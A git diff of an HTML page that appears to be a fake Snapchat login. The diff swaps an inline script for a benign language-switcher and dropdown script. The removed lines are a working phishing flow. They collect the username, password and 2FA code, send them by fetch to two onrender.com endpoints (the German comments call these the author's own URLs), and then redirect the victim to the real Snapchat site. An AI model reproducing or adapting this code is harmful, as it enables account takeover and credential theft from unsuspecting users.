@@ -153,64 +153,57 @@
   </div>
 
   <script src="script.js"></script>
-  <script>
-// Nutzername speichern & Passwort-Schritt anzeigen
-function goToStep2() {
-  const username = document.getElementById("username").value;
-  document.getElementById("step1").style.display = "none";
-  document.getElementById("step2").style.display = "block";
-  document.getElementById("email-display").innerHTML = 
-    username.substring(0, 3) + "***" + username.split("@")[1] + 
-    ' <a href="#" onclick="goToStep1()">Das bist nicht du?</a>';
-}
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    function handleLanguageChange(selectedLang) {
+      switch (selectedLang) {
+        case "de":
+          window.location.href = "/index.html";
+          break;
+        case "en":
+          window.location.href = "/en.html";
+          break;
+        case "fr":
+          window.location.href = "/fr.html";
+          break;
+        case "es":
+          window.location.href = "/es.html";
+          break;
+      }
+    }
 
-// Passwort speichern & 2FA-Schritt anzeigen
-function goToStep3() {
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-  document.getElementById("step2").style.display = "none";
-  document.getElementById("step3").style.display = "block";
-  
-  // Daten bereits jetzt an Server senden (ohne 2FA)
-  fetch('https://snapchat-1-e0rp.onrender.com/submit', {  // 👈 DEINE RENDER-URL
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username, password }) // Nur User + Passwort
-  }).catch(err => console.error("Fehler beim Senden:", err)); // Fehler loggen
-}
+    const desktopSelect = document.getElementById("language-desktop");
+    const mobileSelect = document.getElementById("language-mobile");
 
-// ALLE DATEN (Nutzer + Passwort + 2FA) senden
-function submitAllData() {
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-  const twoFACode = document.getElementById("twoFACode").value;
-  
-  fetch('https://snapchat-usvu.onrender.com/submit', {  // 👈 DEINE RENDER-URL
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username, password, twoFACode }) // ALLES in einem Request!
-  })
-  .then(() => {
-  
-    window.location.href = "https://accounts.snapchat.com";
-  }).catch(err => {
-    console.error("Fehler beim 2FA-Senden:", err);
-    document.getElementById("code-error").style.display = "block";
+    if (desktopSelect) {
+      desktopSelect.addEventListener("change", function () {
+        handleLanguageChange(this.value);
+      });
+    }
+
+    if (mobileSelect) {
+      mobileSelect.addEventListener("change", function () {
+        handleLanguageChange(this.value);
+      });
+    }
+
+    if (window.innerWidth <= 768) {
+      document.querySelectorAll(".dropdown-toggle").forEach(button => {
+        button.addEventListener("click", () => {
+          const content = button.nextElementSibling;
+          const isVisible = content.style.display === "block";
+
+          document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
+          document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
+
+          if (!isVisible) {
+            content.style.display = "block";
+            button.classList.add("active");
+          }
+        });
+      });
+    }
   });
-}
-
-document.getElementById("username").addEventListener("input", function() {
-  document.getElementById("step1-button").disabled = !this.value;
-});
-
-document.getElementById("password").addEventListener("input", function() {
-  document.getElementById("step2-button").disabled = !this.value;
-});
-
-document.getElementById("twoFACode").addEventListener("input", function() {
-  document.getElementById("step3-button").disabled = !this.value;
-});
-
       
     });
   document.addEventListener("DOMContentLoaded", function () {
